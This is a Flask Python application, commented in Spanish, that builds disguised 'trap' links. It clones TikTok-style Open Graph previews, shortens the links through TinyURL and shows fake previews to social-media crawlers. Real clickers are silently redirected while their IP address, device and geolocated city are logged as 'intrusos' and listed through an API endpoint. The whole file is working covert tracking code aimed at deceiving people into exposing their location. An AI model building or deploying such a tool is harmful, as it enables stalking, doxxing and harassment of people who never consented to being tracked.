import os
import random
import string
import requests
from bs4 import BeautifulSoup # Importamos la herramienta de scraping
from flask import Flask, request, jsonify, redirect, render_template
from datetime import datetime, timedelta
import psycopg2 

app = Flask(__name__)

DATABASE_URL = os.environ.get("DATABASE_URL")

# --- CONFIGURACIÓN DE NAVEGADOR FALSO ---
# Usamos esto para que TikTok crea que somos una persona y nos de los datos
HEADERS_FALSOS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept-Language': 'es-ES,es;q=0.9',
}

def get_db_connection():
    if not DATABASE_URL: return None
    conn = psycopg2.connect(DATABASE_URL)
    return conn

def inicializar_db():
    try:
        conn = get_db_connection()
        if conn is None: return
        cur = conn.cursor()
        # Aseguramos que existan todas las tablas
        cur.execute("""
            CREATE TABLE IF NOT EXISTS trampas (
                id SERIAL PRIMARY KEY,
                token VARCHAR(50) UNIQUE NOT NULL,
                nombre VARCHAR(100),
                url_destino TEXT,
                meta_titulo TEXT,
                meta_desc TEXT,
                meta_img TEXT,
                created_at TIMESTAMP DEFAULT NOW()
            );
        """)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS intrusos (
                id SERIAL PRIMARY KEY,
                trampa_id INTEGER REFERENCES trampas(id),
                ip_address VARCHAR(45),
                user_agent TEXT,
                city VARCHAR(100),
                captured_at TIMESTAMP DEFAULT NOW()
            );
        """)
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e: print(f"Error DB: {e}")

def generar_token():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=6))

def obtener_ubicacion(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
        data = response.json()
        if data['status'] == 'success':
            return f"{data['city']}, {data['country']}"
        else: return "Desconocida"
    except: return "Error Geo"

def acortar_link(url_larga):
    try:
        api_url = f"https://tinyurl.com/api-create.php?url={url_larga}"
        response = requests.get(api_url, timeout=5)
        if response.status_code == 200: return response.text
        return url_larga
    except: return url_larga

# --- NUEVA FUNCIÓN: EL CLONADOR AUTOMÁTICO ---
def clonar_metadatos(url_destino):
    print(f"🕵️‍♂️ Clonando datos de: {url_destino}")
    try:
        # 1. Descargamos la web destino
        response = requests.get(url_destino, headers=HEADERS_FALSOS, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # 2. Buscamos las etiquetas Open Graph (el estándar de redes sociales)
        titulo = soup.find("meta", property="og:title")
        desc = soup.find("meta", property="og:description")
        img = soup.find("meta", property="og:image")
        
        # 3. Extraemos el contenido si existe
        t_final = titulo["content"] if titulo else "TikTok - Video Viral"
        d_final = desc["content"] if desc else "Mira este video increíble."
        i_final = img["content"] if img else "https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e95c4d0840c83a04.png"
        
        return t_final, d_final, i_final
    except Exception as e:
        print(f"❌ Error clonando: {e}")
        return "Video Viral", "Haz clic para ver", ""

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/update_db_schema')
def update_db_schema():
    # ... (Igual que antes, por si acaso) ...
    return "DB OK"

@app.route('/api/crear_trampa', methods=['POST'])
def crear_trampa():
    data = request.json
    nombre = data.get('nombre', 'Trampa Auto')
    url_destino = data.get('url_destino', '')
    
    # 1. AUTO-CLONADO
    # Si el usuario NO escribió título manual, lo robamos de la web original
    user_titulo = data.get('meta_titulo', '')
    user_desc = data.get('meta_desc', '')
    
    if not user_titulo or not user_desc:
        # Activamos el scraping
        clon_t, clon_d, clon_i = clonar_metadatos(url_destino)
        
        # Usamos lo clonado si el usuario dejó vacíos los campos
        meta_titulo = user_titulo if user_titulo else clon_t
        meta_desc = user_desc if user_desc else clon_d
        meta_img = data.get('meta_img') if data.get('meta_img') else clon_i
    else:
        # Si el usuario escribió algo manual, usamos eso
        meta_titulo = user_titulo
        meta_desc = user_desc
        meta_img = data.get('meta_img', '')

    token = generar_token()
    
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO trampas (token, nombre, url_destino, meta_titulo, meta_desc, meta_img) VALUES (%s, %s, %s, %s, %s, %s)", 
        (token, nombre, url_destino, meta_titulo, meta_desc, meta_img)
    )
    conn.commit()
    cur.close()
    conn.close()
    
    link_railway = f"{request.host_url}s/{token}"
    link_final = acortar_link(link_railway)
    
    return jsonify({"status": "ok", "link": link_final})

@app.route('/s/<token>')
def trampa_activada(token):
    # --- LÓGICA DE CAPTURA IDÉNTICA ---
    ip_victima = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip_victima and ',' in ip_victima: ip_victima = ip_victima.split(',')[0].strip()
    user_agent = request.headers.get('User-Agent')
    ubicacion = obtener_ubicacion(ip_victima)
    
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT id, url_destino, meta_titulo, meta_desc, meta_img FROM trampas WHERE token = %s", (token,))
    trampa = cur.fetchone()
    
    url_final = "https://tiktok.com"
    disfraz = {"t": "TikTok", "d": "Video", "i": ""}
    
    if trampa:
        trampa_id = trampa[0]
        url_final = trampa[1]
        disfraz["t"] = trampa[2]
        disfraz["d"] = trampa[3]
        disfraz["i"] = trampa[4]
        
        # Filtro de Bots
        ua = str(user_agent).lower()
        es_bot = "facebook" in ua or "whatsapp" in ua or "telegram" in ua or "twitter" in ua
        
        if not es_bot:
            cur.execute("INSERT INTO intrusos (trampa_id, ip_address, user_agent, city) VALUES (%s, %s, %s, %s)", 
                       (trampa_id, ip_victima, user_agent, ubicacion))
            conn.commit()
    
    cur.close()
    conn.close()

    # --- SERVIR EL DISFRAZ CLONADO ---
    ua = str(user_agent).lower()
    if "facebook" in ua or "whatsapp" in ua or "telegram" in ua or "twitter" in ua:
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta property="og:type" content="website">
            <meta property="og:title" content="{disfraz['t']}">
            <meta property="og:description" content="{disfraz['d']}">
            <meta property="og:image" content="{disfraz['i']}">
            <meta name="twitter:card" content="summary_large_image">
        </head>
        <body></body>
        </html>
        """

    return redirect(url_final)

@app.route('/api/ver_ataques', methods=['GET'])
def ver_ataques():
    # ... (Igual que antes) ...
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("""
        SELECT t.nombre, i.ip_address, i.captured_at, i.user_agent, i.city 
        FROM intrusos i JOIN trampas t ON i.trampa_id = t.id
        ORDER BY i.captured_at DESC LIMIT 20
    """)
    ataques = cur.fetchall()
    cur.close()
    conn.close()
    
    resultado = []
    for a in ataques:
        hora_ecu = a[2] - timedelta(hours=5)
        resultado.append({
            "trampa": a[0],
            "ip": a[1],
            "hora": hora_ecu.strftime("%Y-%m-%d %H:%M:%S"),
            "dispositivo": a[3],
            "ubicacion": a[4] if a[4] else "Desconocida"
        })
    return jsonify(resultado)

inicializar_db()

if __name__ == '__main__':
    app.run(debug=True, port=5000)